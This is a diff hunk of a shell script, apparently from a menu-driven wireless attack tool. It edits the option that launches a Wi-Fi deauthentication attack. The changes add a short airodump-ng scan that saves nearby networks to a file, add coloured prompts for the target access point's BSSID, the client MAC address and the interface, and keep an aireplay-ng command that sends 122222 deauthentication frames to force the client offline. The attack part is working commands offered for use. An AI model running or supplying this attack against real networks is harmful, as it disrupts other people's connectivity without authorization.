@@ -295,25 +295,45 @@ fi
 if [ $choix = "da" ]
 then
 clear
+n_secondes=7
+( xterm -e "airodump-ng wlan0 >> lewifi.txt") &
+sleep 7
+kill $!
+cat lewifi.txt
 echo -------------------------
 echo  Deauthentication Attack
 echo  - need monitor monde -
 echo -------------------------
-echo ap bssid
+echo
+echo
+echo  acces point bssid
+echo
+echo
+echo -e  '\e[1;31m '
 read -p  'bssid : ' bssidda
+echo -e  '\e[1;37m '
 echo
-echo mac address client
 echo
+echo  mac address client
+echo
+echo
+echo -e  '\e[1;31m '
 read -p 'mac adresse :' macda
+echo -e  '\e[1;37m '
 echo
-echo interface
 echo
+echo  interface
+echo
+echo
+echo -e  '\e[1;31m '
 read -p ' interface : ' interfaceda
-
+echo -e  '\e[1;37m '
+rm -r -f lewifi.txt
 clear
 echo -e  '\e[1;32m '
 echo attack started ... 
-xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda | xterm -title "Deauthentication-Attack" -e airodump-ng $interfaceda
+xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda | xterm -title "Deauthentication-Attack" -e airodump-ng $interfaceda 
+
 fi
 
 
